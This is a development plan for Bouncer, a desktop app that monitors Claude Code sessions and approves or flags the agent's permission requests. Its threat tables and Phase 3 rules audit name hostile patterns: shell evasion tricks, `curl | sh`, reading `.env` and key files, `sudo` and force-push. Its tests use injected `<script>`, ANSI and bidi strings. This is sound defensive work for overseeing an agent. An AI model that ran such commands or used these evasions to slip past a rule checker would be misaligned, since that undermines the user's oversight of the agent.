# Bouncer — MVP plan

Bouncer is a free, open-source desktop companion for Claude Code. It shows every
session live, auto-approves safe actions under rules you control, flags risky ones
with a plain reason, and never blocks the agent. A security guard for coding
agents, with personality. Ten phases (0–9), $0.

**Current phase: Phase 5d — Sound pack (5a, 5b, 5c and the island window region merged)**

## MVP scope

| In the MVP | After the MVP |
| --- | --- |
| Live view of every Claude Code session (several at once) | A second agent (Codex CLI, Gemini CLI) |
| Approve or deny permission requests from the island | Approving from your phone |
| Rules engine: auto-allow safe actions, flag risky ones with a reason | Auto-update |
| Local activity log and a "while you were away" summary | Sitting exactly inside the MacBook notch |
| Bouncing-ball character and sounds, made in code (Phase 5) | Music on macOS |
| Chat through the local Claude Code, file drop, music on Windows (Phases 6–8) | Other integrations |

Events are normalized into one internal `Event` format from Phase 1, so a second
agent later is a new adapter, not a rewrite. The adapter abstraction is added only
when that second agent arrives.

## Architecture

```
Claude Code ──runs──▶ relay (bouncer-hook) ──user-only socket / pipe──▶ app core (Rust)
     ▲                                                                  ├─ rules engine (allow / ask + reason)
     │                                                                  ├─ activity log (local, redacted)
     │                                                                  ▼
     └──── allow / deny / nothing ◀──── relay ◀──── your click ──── island window
Fails safe: app missing or slow → relay prints nothing → Claude Code asks in the terminal.
```

## How every phase runs

1. **Audit** — read the docs and code the phase touches; write the threat list and
   "done when" criteria here before any code.
2. **Implement** — small commits, one concern each, in the order listed.
3. **Test** — unit tests, integration tests on recorded real hook payloads, a short
   manual script on a real machine.
4. **Verify** — security checklist, reread the whole diff, update docs, tag `v0.N.0`.

---

## Setup — toolchain on Windows

- [x] Check versions: `git --version`, `node -v`, `rustc --version`, `cargo --version`, `winget --version`
- [x] Install what's missing (Charan approves each Windows admin prompt):
  - `winget install --id Rustlang.Rustup -e`
  - `winget install --id Microsoft.VisualStudio.2022.BuildTools -e --override "--wait --passive --add Microsoft.VisualStudio.Workload.VCTools --includeRecommended"`
  - `winget install --id OpenJS.NodeJS.LTS -e`
  - `winget install --id Git.Git -e` (if git is missing)
- [x] Close and reopen the terminal / Claude Code so PATH updates, then re-check versions
- [x] `rustup default stable` and `rustup component add clippy rustfmt`
- [x] WebView2 present (it ships with Windows 10/11)
- [x] Git identity set in the repo: `git config user.name` / `git config user.email`
- [x] Smart App Control off (Windows Security → App & browser control). In enforce
  mode it blocks freshly compiled Rust build scripts, so Tauri can't build.

## Phase 0 — Repo and guardrails (~2 days)

- **Audit:** check "bouncer" isn't used by another developer tool on GitHub,
  crates.io and npm (if taken, keep "Bouncer" as the app name and use `bouncer-app`
  for package names); read Tauri 2's security guide (capabilities, CSP).
- **Implement:** cargo workspace (`relay`, `core`, `app`), Tauri 2 scaffold with
  plain TypeScript, MIT `LICENSE`, `SECURITY.md`, `CREDITS.md`, `.gitignore`, README stub.
- **Test:** CI on Windows + macOS runs `cargo fmt --check`, `cargo clippy -D warnings`,
  `cargo test`, `cargo deny check`, `npm audit`, gitleaks; a weekly scheduled job
  runs `cargo deny check advisories`.
- **Verify:** Dependabot on; Actions pinned to commit SHAs; workflow
  `permissions: contents: read`; private vulnerability reporting on; branch
  protection on `main` (set after CI first runs): PR required (0 approvals), every
  CI job on both OSes a required check, branch up to date before merge, linear
  history, no force pushes or deletion, applies to admins. Signed commits: later.
- Commits: `chore: init workspace` → `chore: add tauri app shell` →
  `ci: add lint, test and audit workflow` → `docs: add license, security policy and readme stub`

### Phase 0 audit (2026-10-01)

Name: settled as `bouncer-app` (see Decisions). Versions today: `tauri` 2.12.1,
`tauri-build` 2.7.1, `@tauri-apps/cli` and `@tauri-apps/api` 2.12.1, Vite 8.3,
TypeScript 7.0, Rust 1.99.

What Tauri 2's security guide means for us:

- **Commands are open by default.** Every registered command can be called from
  every window unless `build.rs` lists them with
  `tauri_build::AppManifest::new().commands(&[...])` and a capability grants each
  one. Phase 0 registers no commands; Phase 2 must use the manifest from its first
  command.
- **Capabilities:** every file in `src-tauri/capabilities/` is enabled automatically.
  We keep exactly one file, bound to the `main` window, with no `remote` URLs.
- **The template is not secure as shipped.** `create-tauri-app` gives `"csp": null`,
  the `opener` plugin with `opener:default`, a sample `greet` command, a Vite dev
  server that listens on `TAURI_DEV_HOST`, and mobile-only crate types. All of that
  is removed.
- **CSP** goes in `app.security.csp`; Tauri adds hashes/nonces for bundled assets at
  build time. Ours: `default-src 'self'; script-src 'self'; style-src 'self';
  img-src 'self'; connect-src ipc: http://ipc.localhost; object-src 'none';
  base-uri 'none'; form-action 'none'; frame-ancestors 'none'`.
- Also set: `freezePrototype: true`. Leave as default: `withGlobalTauri: false`,
  `assetProtocol.enable: false`, no isolation pattern (we load no third-party
  frontend code). Devtools stay out of release builds (no `devtools` feature).
- Lifecycle: the dev server binds to localhost only; pin Actions to SHAs; audit both
  Rust and npm dependencies.

Phase 0 threats:

| Threat | Fix |
| --- | --- |
| Insecure template defaults ship (no CSP, opener plugin, sample command) | Strip them; CSP set; one minimal capability; reviewed in Verify |
| Any window can call any command | No commands in Phase 0; `AppManifest` allow-list from Phase 2 |
| Dev server reachable from the LAN | Vite `host` fixed to `localhost`, `strictPort` |
| Compromised or retagged GitHub Action | Every `uses:` pinned to a full commit SHA with a version comment; Dependabot updates them |
| CI token abused | Workflow-level `permissions: contents: read`; no secrets used |
| Vulnerable / unlicensed / non-crates.io dependency | `cargo deny check` (advisories, licenses, bans, sources: crates.io only); `npm audit`; lockfiles committed; `npm ci` in CI |
| Secret committed | gitleaks in CI on full history; GitHub secret scanning and push protection (already on) |
| Direct push or force push breaks `main` | Branch protection: PR + required checks, linear history, no force push/delete, admins included |
| New advisory lands between pushes | Weekly scheduled `cargo deny check advisories` |
| Vulnerability reported in public | `SECURITY.md` + private vulnerability reporting |
| Line-ending drift between Windows and macOS (fmt check, diffs) | `.gitattributes` with `* text=auto eol=lf` (Git for Windows sets `core.autocrlf=true` system-wide) |

Phase 0 is done when:

- [x] `cargo fmt --check`, `cargo clippy --all-targets -- -D warnings` and `cargo test`
      pass locally on Windows and in CI on `windows-latest` and `macos-latest`
- [x] Crates `bouncer-relay`, `bouncer-core`, `bouncer-app`; `relay` depends only on
      std + `serde_json`
- [x] `npm run tauri dev` opens an empty Bouncer window on Windows
- [x] `tauri.conf.json` has the CSP above and `freezePrototype: true`; no plugins; no
      commands; one capability file for `main` with the fewest core permissions that
      work; no `remote`
- [x] `cargo deny check`, `npm audit` and gitleaks pass in CI; the weekly
      advisories job exists
- [x] Every Action pinned to a SHA; workflow `permissions: contents: read`
- [x] Dependabot (cargo, npm, github-actions) and private vulnerability reporting
      are on; branch protection on `main` as listed under Verify
- [x] `LICENSE` (MIT), `SECURITY.md`, `CREDITS.md`, `README.md`, `.gitignore`,
      `.gitattributes` exist

Plan corrections found in this audit:

1. `cargo deny check` already checks the RustSec advisory database, which is what
   `cargo audit` does. Decision: drop `cargo audit`; add a weekly scheduled
   `cargo deny check advisories` job.
2. The plan didn't cover npm dependencies. Added `npm audit` and npm in Dependabot.
3. CI must build the frontend (`npm ci && npm run build`) before clippy and tests,
   because `tauri::generate_context!` fails to compile when `frontendDist` is missing.
4. Branch protection that requires status checks also blocks direct pushes to
   `main`. Decision: once protection is on, every change goes through a PR.
5. `.gitattributes` was missing from the file list.

## Phase 1 — Hook relay and local socket (~1 week)

- **Audit:**
  - Read https://code.claude.com/docs/en/hooks and record the exact stdin fields and
    exact allow/deny output for `PermissionRequest` and `PreToolUse`. Save real
    payloads from a playground session as test fixtures.
  - Confirm which events fire for actions Claude Code already allows by its own
    permission rules.
  - Pick the lowest supported Claude Code version (needs every hook we use) from the
    changelog; Bouncer tells users on older versions to update.
  - Study Coucou's relay deadlines and peer checks (github.com/Louis-CFM/coucou,
    `windows/hook/src/main.rs`).
- **Implement:**
  - `relay` binary: stdin capped at 1 MB, drop large fields (`tool_response`),
    connect within 300 ms, fire-and-forget within 2 s, permission requests wait up to 110 s.
  - Unix socket in a per-user `0700` folder (macOS); named pipe restricted to the
    user's SID (Windows); both ends verify same user.
  - Normalized `Event` struct (agent, session, project, tool, input, time).
  - `bouncer install-hooks` / `uninstall-hooks`: dated backup, merge only our
    entries, show diff, confirm, atomic write.
- **Test:** fixtures parse; app closed → exit < 50 ms with empty output; app hung →
  gives up at deadline; malformed or 5 MB input → clean exit; two sessions stream;
  install + uninstall leaves `settings.json` byte-identical.
- **Verify:** no default "allow"; another user cannot connect; no unconfirmed writes.
- Commits: `feat(relay): read and forward hook events` → `feat(core): normalized event model` →
  `feat(app): local socket server with peer check` → `feat(relay): wait for permission decisions with deadline` →
  `feat(cli): safe hook install and uninstall` → `test(relay): fixtures, timeouts and malformed input`

### Phase 1 audit (2026-10-01)

Sources: code.claude.com/docs/en/hooks, the Claude Code `CHANGELOG.md`, Coucou's
`windows/hook/src/{main,win}.rs`, and payloads recorded in `../bouncer-playground`
(its own `.claude/settings.local.json`; user settings untouched).

What Claude Code sends and accepts:

- Every hook gets JSON on stdin with `session_id`, `transcript_path`, `cwd`,
  `hook_event_name`, usually `permission_mode`, plus per-event fields.
  `PreToolUse` / `PermissionRequest` add `tool_name`, `tool_input`, `tool_use_id`
  (`PermissionRequest` may add `permission_suggestions`); `PostToolUse` adds
  `tool_response` (can be a whole file); `UserPromptSubmit` adds `prompt`.
- Exit 0 + empty stdout = "no decision", Claude Code carries on normally. Exit 2
  blocks on `PreToolUse` (we never use it); other non-zero codes are logged errors.
- `PermissionRequest` allow:
  `{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}`;
  deny: same with `{"behavior":"deny","message":"..."}`. We send no `updatedInput`
  and no permission updates.
- `PreToolUse` fires before every tool call, including ones Claude Code's own rules
  already allow; `PermissionRequest` fires only when Claude Code would show a
  dialog. So: Bouncer observes everything via `PreToolUse` (prints nothing) and
  answers only `PermissionRequest`.
- Hooks for one event run in parallel; the default command timeout is 600 s
  (since 2.1.3). We set `timeout` explicitly anyway: 120 s for
  `PermissionRequest` (above our 110 s wait), 5 s for the rest.
- Exec form (`"command": <path>, "args": []`, since 2.1.139) spawns the relay
  without a shell, so paths with spaces ("Full Time") and shell differences
  (Git Bash vs PowerShell on Windows) don't matter.
- Hooked events: `SessionStart`, `SessionEnd`, `UserPromptSubmit`, `PreToolUse`,
  `PostToolUse`, `PermissionRequest`, `Notification`, `Stop`.

Lowest supported Claude Code version: **2.1.139** — `PermissionRequest` exists
since 2.0.45, the fix stopping hook "allow" from bypassing `deny` rules landed in
2.1.77, and exec-form `args` arrived in 2.1.139.

From Coucou (studied, not copied): 300 ms connect / 2 s fire-and-forget / 110 s
decision budgets enforced by the main thread with `recv_timeout` (a worker does the
blocking I/O and is abandoned on overrun); SID in the pipe name; relay checks the
pipe server's SID via `GetNamedPipeServerProcessId`; only exact, known answers
print anything. Differences: Coucou truncates long strings, which could show a
user a cut-off command to approve — Bouncer forwards inputs whole and drops the
event instead if stdin exceeds 1 MB; Bouncer also restricts the pipe's DACL and
checks the client on the server side.

Transport:

- Windows: `\\.\pipe\bouncer-<SID>`, created with DACL `D:P(A;;GA;;;<SID>)`,
  `FILE_FLAG_FIRST_PIPE_INSTANCE` (fails if someone squatted the name) and
  `PIPE_REJECT_REMOTE_CLIENTS`. Server checks the client process's SID, relay checks
  the server's. Win32 via `windows-sys` (decision below).
- macOS: `~/Library/Application Support/Bouncer/bouncer.sock` (was
  `$TMPDIR/bouncer-<uid>/`, changed after review: `$TMPDIR` can differ between
  the GUI app and a terminal); the app creates the folder `0700`
  and refuses to use one that is a symlink, not ours, or open to others. Both ends
  compare `getpeereid` with `getuid` (two hand-declared libc functions).
- Wire: the relay sends one JSON line; for `PermissionRequest` the app answers one
  line, exactly `allow` or `deny`. Anything else, EOF or timeout → nothing printed.
- The server lives in `bouncer-core` (`ipc` module) so relay integration tests can
  run a real server; the app only starts it. `BOUNCER_ENDPOINT` overrides the
  path in debug/test builds only (peer checks still apply).
- `bouncer install-hooks` / `uninstall-hooks` is a small `bouncer` binary in
  `bouncer-core` (the app is a GUI-subsystem exe on Windows and can't prompt in a
  console). It targets `~/.claude/settings.json` (or `$CLAUDE_CONFIG_DIR`) unless
  `--settings <file>` is given. Our entries = hook commands whose file name is
  `bouncer-hook[.exe]`.

Phase 1 threats:

| Threat | Fix |
| --- | --- |
| Relay prints "allow" by mistake | Only an exact `allow` line from a verified app, only for `PermissionRequest`; every other path prints nothing; tests assert empty stdout |
| App missing / slow / hung blocks Claude Code | 300 ms connect, 2 s fire-and-forget, 110 s decision; main thread never blocks on I/O; exit 0 always |
| Another user answers or reads events | User-only DACL / `0700` folder; SID / uid check on both ends |
| Pipe-name squatting (Windows) | SID in name, `FIRST_PIPE_INSTANCE`, relay checks server SID |
| Socket folder swapped for a symlink (macOS) | `symlink_metadata`, owner and mode checked before bind |
| Huge or malformed stdin | 1 MB cap → drop event; parse failure → exit 0; `tool_response` dropped |
| User approves a truncated command | No per-field truncation; whole event or nothing |
| Settings file damaged or clobbered | Dated backup, merge only our entries, diff shown, `y` required, atomic rename; key order kept (`serde_json` `preserve_order`) |
| Uninstall removes user hooks | Only entries pointing at `bouncer-hook` removed; containers removed only if we emptied them |
| Shell injection via install path | Exec form, no shell |
| Hooks fire inside the Claude Code session building Bouncer | Recording and manual tests only in `../bouncer-playground` |

Phase 1 is done when:

- [x] Relay: stdin > 1 MB, malformed JSON, missing fields, app closed → empty
      stdout, exit 0; app closed exits fast (measured: ~25 ms median on Windows,
      including process start)
- [x] Hung app: fire-and-forget gives up at 2 s; decision budget is 110 s (tested:
      still waiting after 3 s; the 110 s value itself is a constant, not run)
- [x] Real recorded payloads (playground) are fixtures and parse into `Event`
- [x] `allow`/`deny` from the app print the documented JSON; anything else prints
      nothing; non-`PermissionRequest` events never print
- [x] Two sessions stream concurrently to one server
- [x] Pipe DACL / socket folder mode set; peer check on both ends (code + test of
      the own-user path; another-user path reviewed by hand). Live pipe read back
      as `D:P(A;;FA;;;<own SID>)`, protected, one entry
- [x] install + uninstall leaves a settings file byte-identical; backup written;
      no write without `y`; user hooks untouched
- [x] Manual: real `PermissionRequest` allowed end to end, and unanswered → normal
      terminal prompt (playground, Claude Code 2.1.143 — first written down as
      2.1.287, corrected after review)
- [x] Manual: real `PermissionRequest` denied end to end (playground, default
      permission mode: Claude Code showed "Denied in Bouncer", file not created)
- [x] fmt, clippy, tests green locally and in CI (Windows + macOS)

Manual checks (playground `../bouncer-playground`; version read from each
session transcript's `"version"` field):

- 2026-10-02, Claude Code 2.1.143 (session `c419a738`): a real Write
  `PermissionRequest` allowed through Bouncer; unanswered requests fell back to
  the terminal prompt; `git status` (allowed by Claude Code) fired only
  `PreToolUse`. Fixtures: `claude-code-2.1.143-*` (12).
- 2026-10-02, Claude Code 2.1.287 (session `4936ec29`, `auto` mode): Bash tool
  events only; no `PermissionRequest` fired. Fixtures: `claude-code-2.1.287-*`.
- 2026-10-02, Claude Code 2.1.287 (session `c6c7d2ff`, `default` mode): a real
  Write of `deny-test.txt` denied through Bouncer; Claude Code showed "Denied in
  Bouncer" and the file wasn't created. Fixture:
  `claude-code-2.1.287-PermissionRequest-Write.json` (+ its `PreToolUse`,
  `Notification`). Automated equivalent: `permission_answers_print_the_documented_json`.

Plan corrections found in this audit:

1. Relay dependencies: std + `serde_json` + `windows-sys` (Windows only).
   Decision (Charan): `windows-sys` 0.61 — already in `Cargo.lock` via Tauri.
2. The socket server goes in `bouncer-core`, not `bouncer-app` (testability); the
   CLI is a `bouncer` binary in `bouncer-core`.
3. Hook timeouts must be set explicitly; exec form needs Claude Code ≥ 2.1.139.
4. "Drop large fields" means drop `tool_response` and refuse > 1 MB, not truncate.
5. (Verify) The relay first read stdin outside the deadline; a stdin left open
   would have hung it until Claude Code's hook timeout. Fixed and tested.

### Phase 1 review follow-ups (2026-10-02, on `phase-2`)

From Charan's review of PR #2, each a separate commit with tests:

1. `BOUNCER_ENDPOINT` is honored only in debug/test builds; CI also runs the
   relay's unit tests in release to prove release ignores it.
2. Settings backups (and the replacement file) get the original's permissions
   before any byte is written.
3. macOS socket moved to `~/Library/Application Support/Bouncer/` (fixed per
   user). Socket paths are limited to 104 bytes; that leaves room for user names
   up to ~48 characters, and a longer one makes `bind` fail safe.
4. `CLAUDE_CONFIG_DIR` is respected (it already was) and now tested end to end;
   an empty value no longer means `./settings.json`.
5. The 2.1.143 fixture names were right. The nine "2.1.287" fixtures were
   recorded by a session still running 2.1.143 (transcript `"version"` field);
   renamed, and ten real 2.1.287 recordings added. A test ties each fixture name
   to its recording session's version. The allow-path manual test also ran on
   2.1.143; the deny-path one ran on 2.1.287.

Also fixed: a race in two relay tests that counted events before the server's
handler thread had run.

## Phase 2 — Island window and manual approvals (~1.5 weeks)

- **Audit:** Tauri window options (transparent, always on top, no taskbar icon, no
  focus stealing); list every IPC command needed and nothing more.
- **Implement:** states hidden / peek / open; session list by session ID; approval
  card (agent, project, tool, full command in monospace, Allow once / Deny); queue
  with count, nothing dropped; decisions bound to single-use request IDs; tray menu
  (Pause, Settings, Quit).
- **Test:** approve and deny real requests; unanswered → terminal prompt after
  deadline; three sessions; `<script>`, ANSI escapes and right-to-left Unicode show
  as inert text.
- **Verify:** CSP `script-src 'self'`, no remote content; capabilities limited to our
  commands (no shell, no fs plugin); `textContent` only; idle CPU ~0%; Allow buttons
  arm after 600 ms, Allow is never default focus, Enter does not approve.
- Commits: `feat(app): island window shell` → `feat(ui): session list` →
  `feat(ui): approval card and queue` → `feat(app): request-bound decisions` →
  `feat(app): tray menu` → `test(ui): hostile command rendering`

### Phase 2 audit (2026-10-02)

Sources: Tauri 2.12 config schema and source (`tauri`, `tao` 0.37), Phase 0/1 notes.

Window (`main`, the island):

- `visible: false` at start, `decorations: false`, `resizable: false`,
  `alwaysOnTop: true`, `skipTaskbar: true`, `visibleOnAllWorkspaces: true`,
  `dragDropEnabled: false`, no maximize/minimize/close buttons.
- **No focus stealing:** `focus: false` covers only the first show. On Windows
  tao clears its "don't focus" marker after creation, so every later `show()`
  uses `SW_SHOW` and activates the window; on macOS `show()` is
  `makeKeyAndOrderFront`. So the window is `focusable: false`: it never takes
  keyboard focus, and clicks still work (`acceptFirstMouse` on macOS).
  Keystrokes stay in the terminal, so Enter can never approve. Trade-off: the
  island has no keyboard access; Phase 5 (accessibility) revisits it.
- macOS: activation policy `Accessory` (no Dock icon).
- **No transparency:** `transparent` needs `macOSPrivateApi` on macOS. The
  island is an opaque undecorated window instead.
- Placement: top centre of the primary monitor's work area, re-centred on
  every resize. Sizes: hidden (no sessions), peek (a pill), open (a panel that
  scrolls inside).

IPC (every command listed in `build.rs`'s `AppManifest` and granted in the one
capability; no core permissions, no plugins):

| Command | What | Why it's safe |
| --- | --- | --- |
| `subscribe(channel)` | Backend pushes the island view (sessions, queue, paused) on every change | Read-only; Tauri's channel fetch is exempt from the ACL by design |
| `decide(id, allow)` | Answers one queued request | Only a live, unused, backend-issued ID works; Allow refused < 600 ms after the card is issued |
| `expand(open)` | Peek / open when the pill is clicked | Only toggles our own window size |
| `drag()` | Moves the island while the mouse is held (added after Charan's playground test: the island covered a terminal's tab bar) | Only moves our own window; no `core:window` permission given to the page |
| `fit(width, height)` | The page reports its content size; the window follows (sizes live only in `src/styles.css`) | Clamped to 80×24 … 900×900 logical px; placement always inside the work area |

The frontend gets no window, event, shell, fs or opener permissions; the
backend resizes and shows the window itself. The frontend uses `@tauri-apps/api`
(approved by Charan, 2026-10-02) for `invoke` and `Channel` only.

Decisions and queue (`bouncer-core`, `approvals` module, testable without Tauri):

- Each permission request gets a 128-bit ID: two `RandomState` (OS-seeded
  SipHash) hashes of a counter. std only; IDs never leave the process. Single
  use: removed on decide, timeout or pause.
- The connection thread waits on its own channel up to **100 s**, below the
  relay's 110 s budget (`bouncer_relay::DECISION_BUDGET`, now shared). On
  timeout the card is removed and nothing is answered, so the terminal asks.
- FIFO queue across sessions, unbounded, nothing dropped; the card shows "1 of N".
- Pause (tray): every queued request is released unanswered and new ones aren't
  queued, so all go to the terminal. The tray tooltip says "paused" and the
  tray icon becomes a greyed copy made in code. Sessions keep updating.
- Sessions keyed by session ID: project, last tool, state (working / needs
  you / idle); removed on `SessionEnd`.

Rendering (security rule 4):

- Every agent string is set with `textContent`. On top of that, the backend
  makes invisible characters visible before display: C0/C1 controls (ANSI
  escapes), bidi controls (U+202A–202E, U+2066–2069, U+200E/200F, U+061C) and
  zero-width characters become `\u{XXXX}`, so a command can't hide or reorder
  text. The command block is `direction: ltr; unicode-bidi: isolate`.
- Bash shows `tool_input.command`; other tools show `tool_input` as pretty
  JSON, in full (scrolls; never cut).
- A test fails if `src/` uses `innerHTML`, `outerHTML`, `insertAdjacentHTML` or
  `document.write`.
- Allow is disabled for 600 ms each time a new card reaches the front and is
  never focused; the window can't take keys at all.

Phase 2 threats:

| Threat | Fix |
| --- | --- |
| Script / markup injection from a command or path | `textContent` only; CSP `script-src 'self'`; test bans HTML sinks |
| ANSI / bidi / zero-width tricks hide what's approved | Escaped to visible `\u{XXXX}` before display; LTR isolate |
| Forged or replayed decision | Random single-use IDs from the backend; unknown or used ID → error, nothing answered |
| Click lands on the wrong card (queue shifts) | Decision names the ID shown; 600 ms re-arm when the front card changes |
| Accidental approval | 600 ms arm (UI and backend), no focus, no Enter |
| Window steals focus, keystrokes land in the island | `focusable: false` |
| Island blocks Claude Code | 100 s wait < 110 s relay budget; pause and quit release everything |
| Requests lost | Unbounded FIFO; timeout and pause fall back to the terminal, never "allow" |
| Frontend reaches more than it needs | Four commands in the manifest; no core/plugin permissions; no remote URLs |
| Command truncated | Full input shown, scrolls |

Phase 2 is done when:

- [x] Island window: hidden / peek / open; top centre; on top; no taskbar
      entry; never takes focus
- [x] Session list keyed by session ID (rows show folder + current step, per
      Charan); three concurrent sessions shown
- [x] Approval card (agent, project, tool, full command in monospace, Allow once /
      Deny), queue with count, nothing dropped
- [x] Decisions bound to single-use IDs (unit tests: unknown, replayed, early
      Allow, timeout, pause)
- [x] Tray: Pause/Resume (icon and tooltip show paused) and Quit
- [x] Hostile strings (`<script>`, ANSI, RTL override, zero-width) render as
      inert visible text (core tests + manual check)
- [x] End-to-end test: real relay → server → queue → decide → relay prints the
      documented JSON
- [x] Manual: real request approved and denied from the island; unanswered →
      terminal prompt after the deadline; three playground sessions
- [x] CSP unchanged; capability = our five commands only; no plugins;
      measured 0 ms CPU over 10 s at idle (app + 6 WebView processes); idle CPU ~0%
- [x] fmt, clippy, tests green locally and in CI (Windows + macOS)

Manual checks:

- 2026-10-02, no Claude Code (debug relay fed by a script; three fake sessions):
  peek pill at top centre, always on top, never foreground. A queued `Bash`
  request with `<script>`, ANSI and U+202E showed as inert text with
  `\u{001B}` / `\u{202E}` markers. An unanswered request timed out and the relay
  printed nothing.
- 2026-10-02, same setup, Charan clicked Deny (window temporarily focusable):
  card cleared, island shrank to the pill, relay printed the documented deny JSON.
- 2026-10-02, same setup, final `focusable: false`: Charan typed in another
  app, clicked Deny once, kept typing. One click was enough, keyboard focus never
  left the other app, and the relay printed deny.
- 2026-10-02, same setup, tray: Pause turned the icon grey and the tooltip to
  "Bouncer (paused): Claude Code asks in the terminal"; a request while paused
  showed no card and the relay exited empty in 316 ms; the pill read "Paused".
  Resume restored the colour icon, the "Bouncer" tooltip and cards.
- 2026-10-02, same setup, Charan clicked Allow once: one click, card cleared,
  relay printed the documented allow JSON. Charan noticed "1 need you" left over
  from the request sent while paused; fixed (`asks in terminal`) and covered by
  `pause_releases_the_queue_and_queues_nothing`.
- 2026-10-02, Claude Code 2.1.287, playground (sessions `35fc5f3e`, `34088e44`,
  `a8abef54`, default mode): a real Write allowed from the island
  (`island-allow.txt` created); a real Write denied ("Denied in Bouncer",
  `island-deny.txt` absent); an unanswered request (13:16:43) fell back to
  Claude Code's own prompt and was answered there (file written 13:18:34);
  three sessions at once, two requests queued 12 s apart and both allowed.
  Fixture: `claude-code-2.1.287-PostToolUse-Write.json`. Found: the island
  covered the terminal's tab bar and couldn't be moved → `drag`.
- 2026-10-02, debug relay fed by a script: Charan dragged the island, clicked
  it open in place, closed it back to the same spot. Found: opened near a
  corner it went off screen → clamped to the work area (`island_stays_on_screen`);
  dragged under the taskbar it couldn't be reached → pushed back inside on every
  move. The "C:workdrag-test" label was the test command losing backslashes
  (checked; `windows_paths_reach_the_island_intact` guards our side).
- 2026-10-02, debug relay fed by a script, two monitors: Charan dragged the pill
  between screens and back. Found: the taskbar guard stopped it crossing
  monitors → it now acts only when the centre is out of reach
  (`reachable_points_need_no_push`). Found: the guard fought the drag over the
  taskbar (stutter) → it now runs after the island is still for 400 ms; a short
  settle delay near the taskbar is expected. Taskbar recovery and tray Quit
  confirmed. Stress: 60 concurrent relays (20 sessions) done in 1.7 s, app
  responsive.

Plan corrections found in this audit:

1. Tray "Settings" moves to Phase 5 with the settings screen (Charan).
2. Transparent window dropped (needs the macOS private API).
3. "Enter does not approve" is guaranteed by `focusable: false`; keyboard access
   to the island becomes a Phase 5 accessibility item.
4. New dependency: `@tauri-apps/api` 2.12.1 (Charan approved). Tauri's
   `tray-icon` feature is turned on; it adds no crates to `Cargo.lock`.
5. Known limit: if a relay dies while its card is up (Claude Code killed), the
   card stays until the 100 s deadline; deciding it then does nothing.
6. (Implement) Added `drag` and `fit` commands, sticky placement clamped to the
   work area, and island sizes set only in `src/styles.css` (Charan: behavior
   now, looks later from `design/prototype/`).
7. (Implement) Sessions that never send `SessionEnd` (crashed, or test feeds)
   stay listed until the app restarts. Expiring idle sessions is left for the
   activity-log work (Phase 4).
8. (Verify) Window work from relay threads could deadlock against `fit` on the
   main thread; all window work now runs on the main thread.

### Island restyle to the prototype (2026-10-02, branch `design-island`)

`design/prototype/bouncer-island.html` is the visual source of truth (Charan).
The Phase 2 island was rebuilt to it without changing queue or decision logic.
States built: Hidden (180×5 wake strip, hover 300 ms peeks the pill), Idle pill,
Working pill (rotates every 4 s with several busy sessions), Sessions, Approval,
Approval · queue, Paused, Session detail, Approve an edit. Later states (Risky,
Auto-allowed, Away summary, Chat, File drop, Music) wait for their phases.

Decisions:

- Syntax colors: a small built-in tokenizer (`src/tokenize.ts`: Rust, TS/JS,
  Python, Go, JSON, shell), returning text pieces, never HTML; tested with
  Node's built-in runner (`npm test`, also in CI). No dependency (Charan).
- Session detail's tab bar is hidden until its tabs work; only a close button
  for now. Chat comes in Phase 6, Sound and Settings in Phase 5 (Charan).
- Transparent, rounded window. Charan asked for `macOSPrivateApi` on macOS only.
  In Tauri 2.12.1 that flag is a no-op at runtime (transparency is always
  available) and only drives a build-time feature check that reads one shared
  `Cargo.toml`, so a macOS-only flag would fail the Windows build. It is left
  off. `ROUNDED` in `crates/app/src/main.rs` switches a platform to square
  corners on a solid window if transparency fails. **Mac test:** check rounded
  corners, the shadow, and that nothing opaque shows around the island.
- Diffs come from the hook's own `old_string` / `new_string` / `content`
  (`bouncer-core::code`), never by reading files; line numbers count within the
  change. Paths inside the project show relative to it.
- The window keeps 20 px each side and 32 px below the island for its shadow.
  That band is transparent but still takes clicks (WebView2 has no per-pixel
  hit testing); kept small on purpose.
- Bouncer is built element by element (`src/ball.ts`); the prototype's static
  SVG markup string isn't used, so no HTML string ever reaches the page.
- The approval head has no close button (the prototype shows one, but closing
  can't dismiss a pending request, so it would be a dead button).
- The detail rail shows real past steps and how each got through (Claude Code,
  you allowed / denied, waiting for you, asked in terminal); the prototype's
  future steps ("cargo test", "Done") can't be known and aren't shown.

Manual checks:

- 2026-10-02, debug relay fed by a script, Windows: every built state captured
  from the real window next to the prototype (in the PR). Fixed on the way: a
  long path widened the diff pane and pushed Deny / Allow edit out of view;
  Write cards now show path, blank line, content as the prototype.
- Dev only: two quick hot reloads can leave the old page's `subscribe` last, so
  updates go to a dead page until the next reload. Not reachable outside dev.
- Review of #5 (Charan): the WebView2 debug port used for the captures was set
  inline for one dev run only (not in the user or machine environment; checked
  in the registry). Release builds now clear `WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS`
  at startup. Session detail groups repeated steps ("Searching ×3"), shows the
  latest 6 with "+N earlier", and marks Edit diffs "Excerpt" (checked in the
  real window).

## Phase 3 — Rules engine (~1.5 weeks)

Outcomes: auto-allow (logged), ask with a risk reason, or ask plainly. Nothing is
auto-denied in the MVP; anything not fully understood goes to the user.

- **Audit:** list Claude Code's own permission rules so ours complement them; collect
  evasion examples (`;`, `&&`, `|`, `$(...)`, backticks, `eval`, `bash -c`, aliases,
  `env` tricks, Unicode lookalikes) as test cases.
- **Implement:** `rules.toml` in the user config folder with shipped defaults;
  proper shell-word parser; compound commands auto-allowed only if every part is;
  unparseable → ask; paths fully resolved, outside the project → ask; risk flags
  with one-line reasons (deletes outside project, `.env`/keys, `curl | sh`,
  `git push --force`, `sudo`, shell profiles, `~/.claude`); observe mode by default;
  "Always allow" previews the exact rule.
- **Test:** 150+ case table incl. every evasion example; fuzz test: random input
  never crashes and never auto-allows.
- **Verify:** rules file refused if others can write it; rule changes shown in the
  island; observe mode default on fresh install.
- Commits: `feat(rules): rule file format and defaults` → `feat(rules): command parser and compound handling` →
  `feat(rules): path checks` → `feat(rules): risk flags with reasons` →
  `feat(ui): observe mode and always-allow preview` → `test(rules): case table and fuzzing`

### Phase 3 audit (2026-10-02)

Sources: Phase 1 notes on Claude Code hooks and permission modes, the Phase 2
desk, `design/prototype/bouncer-island.html` (Risky request, Auto-allowed), the
Phase 2 review note on request IDs.

How ours complements Claude Code's own rules:

- Claude Code's `permissions.allow` / `ask` / `deny` (in `settings.json`) run
  first; deny always wins (hook "allow" can't bypass it since 2.1.77). Only
  what Claude Code would ask about reaches `PermissionRequest`, so Bouncer's
  rules only ever answer those. `PreToolUse` stays observe-only.
